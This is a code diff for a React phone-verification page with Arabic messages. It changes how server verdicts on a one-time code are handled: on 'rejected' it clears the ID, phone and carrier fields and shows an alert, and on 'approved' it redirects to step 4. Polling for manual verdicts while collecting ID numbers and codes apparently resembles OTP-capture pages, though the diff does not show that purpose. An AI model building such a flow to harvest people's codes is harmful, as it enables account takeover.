@@ -75,21 +75,25 @@ export default function VerifyPhonePage() {
           window.location.href = '/step4'
         }
         
-        // Check for phone rejection message
-        if (data.phoneRejectionMessage) {
-          setOtpRejectionError(data.phoneRejectionMessage)
-          setShowPhoneOtpDialog(true)
-        }
-        
-        // Check for resend request - show OTP dialog to enter new code
+        // Check for resend request - show OTP dialog with message
         if (data.phoneResendRequested) {
-          setOtpRejectionError("يرجى إدخال رمز التحقق الجديد")
+          setOtpRejectionError("رمز التحقق غير صحيح أو منتهي الصلاحية - يرجى انتظار رمز جديد")
           setShowPhoneOtpDialog(true)
         }
         
-        // Check phone OTP status
-        const phoneOtpStatus = data.phoneOtpStatus
-        if (phoneOtpStatus === 'approved' && window.location.pathname !== '/step4') {
+        // Check for rejection - return to phone form
+        if (data.phoneOtpStatus === 'rejected' && data.phoneRejectionMessage) {
+          // Close OTP dialog if open
+          setShowPhoneOtpDialog(false)
+          setIdNumber("")
+          setPhoneNumber("")
+          setSelectedCarrier("")
+          setOtpRejectionError("")
+          alert(data.phoneRejectionMessage)
+        }
+        
+        // Check phone OTP status - approved
+        if (data.phoneOtpStatus === 'approved' && window.location.pathname !== '/step4') {
           window.location.href = '/step4'
         }
       } catch (err) {
